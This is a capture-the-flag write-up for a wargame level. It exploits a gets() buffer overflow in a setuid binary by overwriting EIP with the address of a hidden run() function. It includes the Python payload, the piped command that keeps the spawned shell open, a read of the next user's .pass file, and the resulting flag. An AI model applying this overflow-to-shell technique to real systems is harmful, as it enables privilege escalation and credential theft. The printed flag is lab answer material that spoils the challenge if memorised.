Level1's protections:
```Shell
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/user/level1/level1
```

Level1's rights:
```Shell
-rwsr-s---+ 1 level2 users  5138 Mar  6  2016 level1
```

When testing, we notice that it only waits for user input and exits.
Decompiling with Ghidra on https://dogbolt.org/ shows two things:
- `gets()` is used with a buffer of 76 bytes
- there is an unused `run()` function that opens a shell

The goal is therefore to find a way to access the `run()` function. `gets()` major vulnerability is not checking
the size of input with the size of the buffer. If you exceed its size, you will overwrite data that can affect the flow of 
execution. There is a specific register in each function (`EIP`, for Instruction Pointer) that stores the address
of the next instruction: we must find where it is and overwrite it with the address of `run()`.

First, let's find `run()`'s address with GDB:
```Shell
(gdb) info function
[...]
0x08048444  run
[...]
```

We know that `EIP` sits right after the end of our buffer.
Using python we craft a payload that will:
- fill the buffer
- overwrite `EIP` with `run()`'s address
The address must be written in what is conventionnally known as Little Endian because our VM system is using that.
```Shell
python -c "print('A' * 76 + '\x44\x84\x04\x08')" > /tmp/payload1
```

However, launching `run()` and opening a shell is not enough. Using a pipe to send our payload instead of writing it manually
has some consequences:
- the shell inside `run()` becomes non-interactive
- it doesn't wait for user input because it encountered EOF and exits almost immediately.
It makes it impossible to write our commands and retrieve the password.
We can bypass that by adding `-` after the first `cat` command to keep stdin open, thus preventing the shell from exiting.
```Shell
cat /tmp/payload1 - | ./level1
Good... Wait what?
cat /home/user/level2/.pass
53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
```
